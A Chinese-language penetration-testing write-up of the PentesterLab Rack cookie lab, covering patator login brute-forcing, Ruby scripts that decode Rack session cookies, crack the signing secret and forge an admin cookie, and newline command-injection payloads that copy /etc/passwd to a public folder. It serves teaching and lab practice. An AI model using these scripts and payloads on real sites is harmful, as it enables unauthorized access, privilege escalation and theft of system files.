***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 ** ***本文原创作者：Aohanh，本文属于FreeBuf原创奖励计划，未经许可禁止转载**  
**

在渗透测试过程中，我们经常会遇到cookie得不到正确的利用，但是在一些框架中（比如PLAY、RACK），我们能利用cookie达到欺骗或篡改的目的，达到跨权登陆，拿取Webshell控制网站权限的作用。  

 **cookie 篡改 (cookie poisoning)
是一项主要以获取模拟和隐私权泄密著称的技术，通过维护客户（或终端用户）身份的会话信息操纵来实现的。通过打造这些 cookie
，攻击者可以模拟一个有效的客户，因此获取详细信息并执行代表病毒的行为。这种打造的能力，像会话 cookie
（或者更通俗地说，会话标识）源自于这些标识不是以安全的方式产生的事实。**

在pentester环境中存在Cookie篡改与命令注入的WEB程序，我们下载下来搭建，下载地址：

<https://pentesterlab.com/exercises/rack_cookies_and_commands_injection>  

![微信图片_20180821115051.png](https://image.3001.net/images/20180821/1534823469_5b7b8c2da6633.png!small)

一个普通的登录界面，可以将攻击分为四个部分：

1.指纹识别：收集有关Web应用程序和正在使用的技术的信息。

2.暴力强制验证页面。

3.篡改机架cookie以获得管理员权限。

4.从管理页面，通过注入获取命令，以运行底层操作系统上的任何命令。

##  **一、指纹识别** ****

抓个包burpsuit,查看信息,我们可以看到应用程序使用Apache 2.2.16和Phusion Passenger
3.0.12在Debian服务器上运行。Phusion可能是托管基于Ruby /
Rack的应用程序的最常用方法。我们还可以看到应用程序将我们重定向到具有HTTP 302和Location标头。

扫扫端口：netcat telnet等等。

##  **二、暴力破解** ****

该题为一正常渗透题，登陆界面考虑SQL注入和爆破等，sql注入万能密码等报错没法实现，采用爆破。爆破方法：1、burpsuit
2、patator暴力破解，这里采用patator暴力破解，(Patator（<http://code.google.com/p/patator/>）是一个多协议暴力破解工具，它可用于查找Web应用程序和许多其他服务的默认凭据)。

扫描语句：patator http_fuzz url=http://目的地址/login method=POST
body='login=FILE0&password=FILE0' 0=~/123.txt accept_cookie=1 follow=1 -x
ignore:fgrep='DNS Manager Login' -l /tmp/patator

http_fuzz用于告诉Patator使用该模块http_fuzz；

url= 用于设置URL；

ethod=POST 告诉Patator使用HTTP POST；

body 是基于我们之前收集的信息的请求的主体。

我们还希望使用accept_cookie=1和follow=1接受应用程序发回的cookie并遵循重定向，因为应用程序在尝试失败后重定向我们，它可能会成功尝试。

-x ignore:fgrep='DNS Manager Login' 用于告诉Patator忽略包含“DNS Manager Login”的响应，一旦我们登录，很可能我们不会在网站的经过身份验证的部分看到这一点。

![1.png](https://image.3001.net/images/20180820/1534772034_5b7ac3427516c.png!small)

找到爆破出的账号密码，登陆成功！

##  **三、篡改cookie提权** ****

登录并检查HTTP流量时，您可以看到服务器发回一个名为的cookie
rack.session。我们将看到如何解码和修改此cookie以提升我们的权限。默认的Cookie有两种形式。

1.字符串：Set-Cookie:rack.session=BAh7BkkiD3Nlc3Npb25faWQGOgZFRiJFNWE4OWJhZmNhNDc2MGY1MTA0MTJm%0AZTM0MDJlZjE3MzAxN2ZjMzBjYWRmMWNiYTgwNGYxNzE3NTI1NTgxNjZmYw%3D%3D%0A;
path=/; HttpOnly

2.字符串和签名分隔符号--：Set-Cookie:
rack.session=BAh7BkkiD3Nlc3Npb25faWQGOgZFRiJFYmJiMTRiODI3YjdlODg2OWMwNWY3%0ANjdmMGNlZjg2YjVkN2VjMDQxN2ZlYTU0YWM3ZTI5OTUwNTY3MjgzMWI3Yg%3D%3D%0A
--61215fa13942903faa4652f73e613aa0ced6db2d; path=/; HttpOnly

rack.session是Ruby里面的中间件实现的一个方法，可以访问应用程序的源代码，则可以通过搜索“使用Rack :: Session ::
Cookie”快速检查用于签署cookie的值。如果使用签名的cookie，该行应该看起来像`使用Rack::Session::Cookie,
:secret => "s3cr3t"。看到可以访问应用程序通过一系列操作过后的源码，那么我们可以对获取到的
cookie进行解码。Cookie编码分为三个部分：

1.使用ruby函数Marshal.dump序列化该对象；

2.结果使用base64编码；

3.然后对结果进行URL编码以防止HTTP出现任何问题。

为了解码cookie，我们需要反转这三个操作：

1.提取cookie值：删除cookie的名称和选项以及签名；

2.使用URL编码和base64解码此值；

3.使用ruby函数Marshal.load加载对象。

通过观察rack.session的形式判断为字符串和签名分隔符号--，所以再将cookie解码后还需要将之后的签名重新匹配。我们首先获取解码过后的cookie值，写一个Ruby脚本：

 **99.rb**

    
    
     #encoding: utf-8
    
    require "net/http"
    
    require "uri"
    
    require 'pp'
    
    require 'base64'
    
    require 'data_mapper'
    
    class User
    
    end
    
    # Remote host
    
    DataMapper.setup(:default,'sqlite3::memory')
    
    URL = "http://地址/login"
    
    # Create URL object
    
    url = URI.parse(URL) 
    
    creds = "test"
    
    # Authentication
    
    resp = Net::HTTP.start(url.host, url.port) do |http|
    
      http.post(url.request_uri, "login=#{creds}&password=#{creds}")
    
    end
    
    # puts get the cookie
    
    c = resp.header['Set-Cookie'].split("=")[1].split("; ")[0]
    
    cookie, signature = c.split("--")
    
    decoded = Base64.decode64(URI.decode(cookie))
    
    begin
    
      # load the object
    
      object = Marshal.load(decoded)
    
      pp object
    
    rescue ArgumentError => e
    
      puts "ERROR: "+e.to_s
    
    End

返回结果：

![图片2.png](https://image.3001.net/images/20180820/1534772072_5b7ac36891aee.png!small)

通过执行这些操作，我们现在可以访问服务器提供的信息。访问信息是好的，特别是如果开发人员在cookie中存储敏感信息，但是这里的目标是操纵cookie以进一步尝试修改我们刚解码的值以更改属性admin。

1.要篡改未签名的cookie，我们需要解码cookie，篡改它然后重新编码。我们刚刚看到了如何解码cookie，现在我们只需要修改属性并重新编码。首先，我们需要在User类中添加一行才能访问该admin属性：类里面添加attt_accessor
:admin。

之后再将Cookie编码：

    
    
    object = Marshal.load(decoded)
    
      pp object
    
      object["user"].admin = true
    
      nc = Base64.encode64(Marshal.dump(object))
    
      pp nc

2.篡改签名的cookie，要篡改签名的cookie，需要找到用于签署cookie的秘密，

使用以前的脚本来篡改和重新签名被篡改的cookie。在文件lib/rack/session/cookie.rb中有如何对签名进行匹配的方法：

    
    
    def generate_hmac(data, secret)
    
        OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
    
      end

写一个Ruby脚本匹配密码字典，获得生成该签名的密钥：

 **456789.rb** ****

    
    
    require 'openssl'
    
     require 'uri'
    
    require 'pp'
    
    COOKIES= "BAh7B0kiD3Nlc3Npb25faWQGOgZFRiJFNjYzYjQ1YTQxZDk1ZGZiMTBiZTA1%0AMjNmMjA2ZGNjOWZiMGUxZDU0MGM1NWQwYzI1MDA5M2FlNzc4YjNiYzYwNEki%0ACXVzZXIGOwBGbzoJVXNlcgs6GEBfcGVyc2lzdGVuY2Vfc3RhdGVvOjJEYXRh%0ATWFwcGVyOjpSZXNvdXJjZTo6UGVyc2lzdGVuY2VTdGF0ZTo6Q2xlYW4HOg5A%0AcmVzb3VyY2VACToLQG1vZGVsYwlVc2VyOgtAbG9naW5JIgl0ZXN0BjsAVDoL%0AQGFkbWluRjoOQHBhc3N3b3JkSSIlMDk4ZjZiY2Q0NjIxZDM3M2NhZGU0ZTgz%0AMjYyN2I0ZjYGOwBUOghAaWRpBzoRQF9yZXBvc2l0b3J5bzobRGF0YU1hcHBl%0Acjo6UmVwb3NpdG9yeQg6CkBuYW1lOgxkZWZhdWx0OhNAaWRlbnRpdHlfbWFw%0Ac3sGQAtDOhxEYXRhTWFwcGVyOjpJZGVudGl0eU1hcHsGWwZpB0AJOg1AYWRh%0AcHRlcm86KERhdGFNYXBwZXI6OkFkYXB0ZXJzOjpTcWxpdGVBZGFwdGVyDTsR%0AOxI6DUBvcHRpb25zQzoVRGF0YU1hcHBlcjo6TWFzaHsOSSILc2NoZW1lBjsA%0ARkkiC3NxbGl0ZQY7AEZJIgl1c2VyBjsARjBJIg1wYXNzd29yZAY7AEYwSSIJ%0AaG9zdAY7AEZJIgAGOwBGSSIJcG9ydAY7AEYwSSIKcXVlcnkGOwBGMEkiDWZy%0AYWdtZW50BjsARjBJIgxhZGFwdGVyBjsARkkiDHNxbGl0ZTMGOwBGSSIJcGF0%0AaAY7AEZJIhAvdG1wL2Rucy5kYgY7AEY6IEByZXNvdXJjZV9uYW1pbmdfY29u%0AdmVudGlvbm1GRGF0YU1hcHBlcjo6TmFtaW5nQ29udmVudGlvbnM6OlJlc291%0AcmNlOjpVbmRlcnNjb3JlZEFuZFBsdXJhbGl6ZWQ6HUBmaWVsZF9uYW1pbmdf%0AY29udmVudGlvbm02RGF0YU1hcHBlcjo6TmFtaW5nQ29udmVudGlvbnM6OkZp%0AZWxkOjpVbmRlcnNjb3JlZDoUQG5vcm1hbGl6ZWRfdXJpbzoVRGF0YU9iamVj%0AdHM6OlVSSQ86DEBzY2hlbWVAHjoPQHN1YnNjaGVtZTA6CkB1c2VyMDsNMDoK%0AQGhvc3RAGToKQHBvcnQwOgpAcGF0aEAgOgtAcXVlcnlDOxh7DkAUQBVAFjBA%0AFzBAGEAZQBowQBswQBwwQB1AHkAfQCA6DkBmcmFnbWVudDA6DkByZWxhdGl2%0AZTA6FEBzcWxpdGVfdmVyc2lvbkkiCjMuNy4zBjsAVDojQHN1cHBvcnRzX2Ry%0Ab3BfdGFibGVfaWZfZXhpc3RzVDoVQHN1cHBvcnRzX3NlcmlhbFQ%3D%0A--61b269ef4410ef84c529196aa4ebbb85193441d8"
    
    def sign(data, secret)
    
      OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
    
    end 
    
    value, signed = COOKIES.split("--",2)
    
    value = URI.decode(value)
    
    File.readlines(ARGV[0]).each do |c|
    
      c.chomp!
    
      if sign(value, c) == signed
    
        puts "Secret found: "+c
    
        exit
    
      end
    
    end

此处的cookie为破解登陆test过后获取的cookie。

结果：  
![图片3.png](https://image.3001.net/images/20180820/1534772108_5b7ac38c6ee83.png!small)

此处我们获取了该cookie的签名密钥，说明我们可以重新签名我们需要提交的Cookie。

添加以下脚本代码：

    
    
    # before
    
    pp object
    
    object["user"].admin = true  
    
    # after
    
    pp object
    
    # new cookie:
    
    nc =Base64.encode64(Marshal.dump(object)) ****
    
     ns = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, "secret", nc) 
    
    newcookie = URI.encode(nc).gsub("=","%3D")+"--"+ns
    
    #pp object
    
    resp = Net::HTTP.start(url.host, url.port) do |http|
    
    http.get("/", {"Cookie" => "rack.session="+newcookie })
    
    puts resp.body
    
    pp newcookie
    
    pp resp
    
    pp resp.body
    
    #pp resp.body
    
    end

如果一切正确完成，您应该得到HTTP /
200响应。但是很多浏览器会重新编码某些字符，如果你重定向到登录页面。就会返回302。我们可以采用burpsuit重新提交cookie。

页面重新加载，返回为管理员界面，提权成功。

## 四、 **命令注入** ****

当开发人员无法确保用户发送的参数被正确编码时，页面易受命令注入攻击。

有很多方法可以获取命令注入：

1.用``来获取我们想要先运行的命令；

2.使用|，&或;在第一个之后插入另一个命令。

与任何Web漏洞一样，测试和查找命令执行是基于大量的尝试来尝试理解代码可能对您提供的数据执行的操作。

您需要在应用程序中找到命令中使用参数的位置。然后，您可以尝试操纵此参数以触发错误或奇怪的行为。

如果您没有看到任何更改，您还可以尝试使用服务器回答的时间。例如，您可以使用以下命令在服务器响应中创建延迟：

    
    
    ping -c 4 127.0.0.1
    
    · sleep 5

如果您看到时间延迟，则可能会在远程服务器上注入命令并运行任意命令。

首先我们尝试直接在修改或者新建数据的窗口进行命令注入。

页面返回错误：

![图片4.png](https://image.3001.net/images/20180820/1534772174_5b7ac3ce7a7ed.png!small)

然而，基于Ruby的应用程序的一个非常普遍的问题是对正则表达式如何工作的误解：在Ruby中，正则表达式默认是多行的。

例如，以下正则表达式/^\d+$/将验证：

“123”，与任何其他语言一样；

“123 \ n arbitrary data”；

“ arbitrary data\ n123 \ n arbitrary data”。

我们现在可以通过抓包并%0a在请求中注入新行（编码为）和任意命令来测试此值：

    
    
    id=1&name=webmail&ip=127.0.0.1%0a`pwd`&ttl=600

页面返回信息：

![图片5.png](https://image.3001.net/images/20180820/1534772188_5b7ac3dcb957a.png!small)

正如我们所看到的，服务器不会发回命令注入的完整输出。我们需要找到一种通过其他方式获取此信息的方法。

第一种方法是，如果命令每行只返回一个单词，则过滤第一个单词。例如，您可以运行ls，它将Gemfile作为第一个结果返回。然后你可以运行ls | grep
-v Gemfile，然后返回config.ru。您可以继续操作直到获得所有结果，但是您可能会达到参数的大小限制并返回到默认错误消息。

使用第一个命令，我们看到（通过运行pwd）应用程序位于/var/www。由于应用程序是基于Rack的应用程序，因此很可能存在公共存储库（据我所知，这是强制性的）。我们可以使用此信息来运行命令并将结果放入文件中，/var/www/public或者只将文件复制到此存储库。

例如，我们可以运行：

    
    
    id=1&name=webmail&ip=127.0.0.1%0a`cp /etc/passwd /var/www/public/`&ttl=600

然后，我们可以直接访问http：//目的地址/passwd。

总结：当网站采用ruby-PLAY框架时，我们能将cookie篡改达到提权登陆的目的，使用irb将cookie解码，用admin管理员用户登陆成功，上传webshell,从而威胁网站权限。

此文部分内容转载于：<https://www.pentesterlab.com/exercises/rack_cookies_and_commands_injection/course>，谢谢浏览。

 ***本文原创作者：Aohanh，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

